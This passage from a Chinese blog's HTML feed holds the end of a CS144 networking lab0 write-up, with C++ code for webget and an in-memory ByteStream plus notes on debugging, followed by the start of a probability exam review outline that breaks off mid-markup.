class="built_in">shutdown</span>(SHUT_WR);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印出接收到的字节，以EOF（End of File）为结束符号</span></span><br><span class="line">    <span class="keyword">while</span>(!client_socket.<span class="built_in">eof</span>() )&#123;</span><br><span class="line">        cout &lt;&lt; client_socket.<span class="built_in">read</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    client_socket.<span class="built_in">close</span>();</span><br><span class="line">   </span><br><span class="line">    cerr &lt;&lt; <span class="string">&quot;Function called: get_URL(&quot;</span> &lt;&lt; host &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; path &lt;&lt; <span class="string">&quot;).\n&quot;</span>;</span><br><span class="line">    cerr &lt;&lt; <span class="string">&quot;Warning: get_URL() has not been implemented yet.\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/07/18/CS144-lab0/webget%E7%BB%93%E6%9E%9C.png" alt="webget结果"></p><h2 id="part2-实现内存上的可靠字节流"><a class="markdownIt-Anchor" href="#part2-实现内存上的可靠字节流"></a> Part2-实现内存上的可靠字节流</h2><h3 id="实验要求"><a class="markdownIt-Anchor" href="#实验要求"></a> 实验要求</h3><p>为了在内存上实现一个字节流，我们首先需要补充对<code>ByteStream</code>类的定义，再实现相应的类方法。我们需要一种数据结构来模拟接收端的缓冲区（buffer），我选择的是<code>deque</code>双端队列来抽象。其次还要两个数据成员<code>total_written</code>和<code>total_read</code>表示这个在字节流上的总读取/写入的数据量。后面我在写<code>end_input()</code>和<code>input_ended()</code>方法时卡住了，还是关于如何判断字节流已经读到了末尾。参考了一下其他朋友的代码后才发现，字节流是否到结尾也是需要自己模拟的，所以又添加了<code>end_stream</code>成员表示字节流是否关闭。</p><blockquote><p>The byte stream is finite: the writer can end the input, and then no more bytes can be written. <strong>When the reader has read to the end of the stream, it will reach “EOF” (end of file) and no more bytes can be read.</strong></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*byte_stream.hh*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ByteStream</span> &#123;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line"><span class="comment">//添加ByteStream类的私有成员</span></span><br><span class="line">    std::deque&lt;<span class="type">char</span>&gt; stream;</span><br><span class="line">    <span class="type">bool</span> end_stream;</span><br><span class="line">    <span class="type">size_t</span> stream_capacity;</span><br><span class="line">    <span class="type">size_t</span> total_written;</span><br><span class="line">    <span class="type">size_t</span> total_read;</span><br><span class="line">    <span class="type">bool</span> _error&#123;&#125;;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试过程"><a class="markdownIt-Anchor" href="#调试过程"></a> 调试过程</h3><p>我使用 VScode 的 CMake 插件进行测试用例的调试。最开始的实现六个测试一个都没通过，修改了一下类定义后只过了<code>byte_stream_construction</code>测试，也就是说我的方法实现有很大的问题。下面是<code>byte_stream_capacity</code>测试用例的调试，可以看见<code>maximum</code>居然是一个很大的数字，后面一看是 maximum 写错了。我想用<code>maximum</code> 表示剩余的缓冲区空间，却错写成了<code>stream.size()-data.size()</code>（已写入的数据减去待写入的数据，我也不知道什么意思…），因此造成了数值溢出！<br><img src="/2024/07/18/CS144-lab0/%E8%B0%83%E8%AF%95.png" alt="调试"><br>接下来继续用测试用例 debug 修改了几个错误后，终于实现了字节流 😭！！<br><img src="/2024/07/18/CS144-lab0/%E6%88%90%E5%8A%9F.png" alt="成功"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*byte_stream.cc*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;byte_stream.hh&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line">ByteStream::<span class="built_in">ByteStream</span>(<span class="type">const</span> <span class="type">size_t</span> capacity): <span class="built_in">stream</span>(), <span class="built_in">end_stream</span>(<span class="literal">false</span>),</span><br><span class="line"> <span class="built_in">stream_capacity</span>(capacity), <span class="built_in">total_written</span>(<span class="number">0</span>), <span class="built_in">total_read</span>(<span class="number">0</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//write方法:Write a string of bytes into the stream. Write as many as will fit, and return how many were written.</span></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">ByteStream::write</span><span class="params">(<span class="type">const</span> string &amp;data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">input_ended</span>())&#123;</span><br><span class="line">        cerr &lt;&lt; <span class="string">&quot;ByteStream is shut down, can&#x27;t write data!\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span>(stream.<span class="built_in">size</span>() &gt;= stream_capacity)&#123;</span><br><span class="line">        cerr &lt;&lt; <span class="string">&quot;The buffer is not enough, can&#x27;t write data now!\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* head = data.<span class="built_in">data</span>();</span><br><span class="line">    <span class="type">size_t</span> maximum = stream_capacity - stream.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">size_t</span> total_bytes;</span><br><span class="line">    <span class="keyword">for</span>(total_bytes = <span class="number">0</span>; total_bytes &lt; <span class="built_in">min</span>(data.<span class="built_in">size</span>(), maximum); total_bytes++)&#123;</span><br><span class="line">        stream.<span class="built_in">push_back</span>(<span class="built_in">static_cast</span>&lt;<span class="type">char</span>&gt;(head[total_bytes]));</span><br><span class="line">    &#125;</span><br><span class="line">    total_written += total_bytes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total_bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//peek_output方法：`len` – bytes will be copied from the output side of the buffer</span></span><br><span class="line"><span class="function">string <span class="title">ByteStream::peek_output</span><span class="params">(<span class="type">const</span> <span class="type">size_t</span> len)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    string peek;</span><br><span class="line">    <span class="keyword">if</span>(len &gt; stream.<span class="built_in">size</span>())&#123;</span><br><span class="line">        cerr &lt;&lt; <span class="string">&quot;Can&#x27;t peek &#x27;len&#x27; bytes data, access exceed!\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> peek;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">int</span>(len); i++)&#123;</span><br><span class="line">        peek += stream[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> peek;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//pop_output方法：len bytes will be removed from the output side of the buffer</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ByteStream::pop_output</span><span class="params">(<span class="type">const</span> <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="built_in">int</span>(len); i++)&#123;</span><br><span class="line">        stream.<span class="built_in">pop_front</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    total_read += len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//read方法： (i.e., copy and then pop) the next &quot;len&quot; bytes of the stream，len bytes will be popped and returns a string</span></span><br><span class="line"><span class="function">std::string <span class="title">ByteStream::read</span><span class="params">(<span class="type">const</span> <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    string output;</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="built_in">buffer_size</span>())&#123;</span><br><span class="line">        cerr &lt;&lt; <span class="string">&quot;Can&#x27;t read &#x27;len&#x27; bytes data, access exceed!\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="built_in">int</span>(len); i++)&#123;</span><br><span class="line">        output = output + stream.<span class="built_in">front</span>();</span><br><span class="line">        stream.<span class="built_in">pop_front</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    total_read += len;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ByteStream::end_input</span><span class="params">()</span> </span>&#123;end_stream = <span class="literal">true</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ByteStream::input_ended</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> end_stream; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">ByteStream::buffer_size</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> stream.<span class="built_in">size</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ByteStream::buffer_empty</span><span class="params">()</span> <span class="type">const</span> </span>&#123;<span class="keyword">return</span> stream.<span class="built_in">empty</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ByteStream::eof</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stream.<span class="built_in">size</span>() == <span class="number">0</span> &amp;&amp; <span class="built_in">input_ended</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">ByteStream::bytes_written</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> total_written; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">ByteStream::bytes_read</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> total_read; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">ByteStream::remaining_capacity</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> stream_capacity - stream.<span class="built_in">size</span>(); &#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>虽然实验起步的阶段踩了非常多的坑，但自己却从没想过放弃，碰到问题就一定要去解决问题，<strong>因为这些都是必须要面对的</strong>，尽管解决问题的过程非常消磨人的精力，不过在痛苦之后能确切地感觉到自己真的变强了。九层之台起于垒土，或许内功的增长取决于平常解决问题收获的点滴。</p><p>为了做计网实验，我实在是花了绝大部分时间在学习其他“知识”，而非学习网络知识本身。<br>在从别人仓库拉 start code 时，之前在搭建博客学习的 git 都忘了很多，才发现自己其实很不了解这个工具，因此看<code>missing semester</code>重新学了一边 git。在项目构建阶段，由于不明白 cmake 和 make 编译失败的原因，在解决完问题后了解了一下 CMake 工具，同时看官方的<code>CMakeLists</code>，也就大概明白配置文档所写内容的含义是什么了。编写代码阶段，由于我根本不会 C++面向对象的特性，所以还花了很多时间学语言，同时也是对着类库看接口，也更清楚地明白构造函数、继承、虚函数等语言特性。</p><p>历时两周多终于完成了第一个 lab，不过我觉得这些时间花的都是值得的，让我了解到了<strong>理论知识以外的实践知识</strong>。希望接下来能更加熟悉整个编写调试的过程，善始善终完成整个大实验。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;序言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#序言&quot;&gt;&lt;/a&gt; 序言&lt;/h2&gt;
&lt;p&gt;满怀热忱开始 cs144 的旅途，第一个碰到的困难便是&lt;strong&gt;环境搭建&lt;/strong&gt;。在这三天时间里不断配置、删库、配置，看了不知道</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>概统期末考点（LaTex试用）</title>
    <link href="http://example.com/2024/07/03/%E6%A6%82%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E8%80%83%E7%82%B9/"/>
    <id>http://example.com/2024/07/03/%E6%A6%82%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%E8%80%83%E7%82%B9/</id>
    <published>2024-07-03T11:23:38.060Z</published>
    <updated>2024-08-08T11:28:31.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="随机事件及概率"><a class="markdownIt-Anchor" href="#随机事件及概率"></a> 随机事件及概率</h2><ul><li>条件概率——全概率公式+贝叶斯公式</li><li>古典概型</li></ul><h2 id="一维随机变量离散型连续型"><a class="markdownIt-Anchor" href="#一维随机变量离散型连续型"></a> 一维随机变量（离散型＋连续型）</h2><ul><li><strong>离散型随机变量分布律/连续型随机变量概率密度</strong><ul><li>概率密度<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span><ul><li>分布函数&lt;——&gt; 概率密度的互推</li><li><strong>重难点（步骤）</strong>：求连续型变量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span></span></span></span>的函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Y</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Y(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span>的分布函数和概率密度</li></ul></li></ul></li></ul><h2 id="二维随机变量离散型连布续型"><a class="markdownIt-Anchor" href="#二维随机变量离散型连布续型"></a> 二维随机变量（离散型+连布续型）</h2><ul><li><strong>离散型随机变量联合分/边缘分布/条件分布（分布律）</strong></li><li><strong>连续型随机变量联合分布/边缘分布/条件分布（概率密度）</strong><ul><li><strong>最难点</strong>：两个连续型随机变量的函数的分布 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Z</mi><mo>=</mo><mi>X</mi><mo>+</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">Z=X+Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Z</mi><mo>=</mo><mi>X</mi><mi>Y</mi></mrow><annotation encoding="application/x-tex">Z=XY</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Z</mi><mo>=</mo><mfrac><mi>X</mi><mi>Y</mi></mfrac></mrow><annotation encoding="application/x-tex">Z=\frac{X}{Y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>、<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Z</mi><mo>=</mo><mi>max</mi><mo>⁡</mo><mo stretchy="false">{</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">}</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">Z=\max\{X,Y\}...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">max</span><span class="mopen">{</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">Y</span><span class="mclose">}</span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></li><li><strong>独立性</strong></li></ul></li></ul><h2 id="随机变量的数字特征"><a class="markdownIt-Anchor" href="#随机变量的数字特征"></a> 随机变量的数字特征</h2><ul><li>数学期望<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span><ul><li><strong>离散型/连续型<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span>公式</strong></li><li><u>随机变量的函数</u>的数学期望<ul><li>离散/连续</li><li>一个随机变量/两个随机变量的函数</li><li>期望的性质</li></ul></li></ul></li><li>方差<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">D(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mi mathvariant="normal">与</mi><mi>E</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">D(X)与E(X)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mord cjk_fallback">与</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mclose">)</span></span></span></span>的关系式</li><li>标准化变量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>X</mi><mo>∗</mo></msup><mo>=</mo><mfrac><mrow><mi>X</mi><mo>−</mo><mi>μ</mi></mrow><mi>σ</mi></mfrac><mrow></mrow></mrow><annotation encoding="application/x-tex">X^* =\frac{X-\mu}\sigma{}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.269439em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.924439em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">σ</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.07847em;">X</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight">μ</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"></span></span></span></span></li><li>四个性质</li><li><strong>切比雪夫<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext mathvariant="italic">(Chebyshev)</mtext></mrow><annotation encoding="application/x-tex">\textit{(Chebyshev)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord textit">(Chebyshev)</span></span></span></span></span>不等式</strong> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo stretchy="false">{</mo><mi mathvariant="normal">∣</mi><mi>X</mi><mo>−</mo><mi>μ</mi><mi mathvariant="normal">∣</mi><mo>≥</mo><mi>ε</mi><mo stretchy="false">}</mo><mo>≤</mo><mfrac><msup><mi>σ</mi><mn>2</mn></msup><msup><mi>ε</mi><mn>2</mn></msup></mfrac></mrow><annotation encoding="application/x-tex">P\{|X-\mu| \geq \varepsilon\}\leq\frac{\sigma^2}{\varepsilon^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mopen">{</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">μ</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">ε</span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.36292em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01792em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">ε</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span 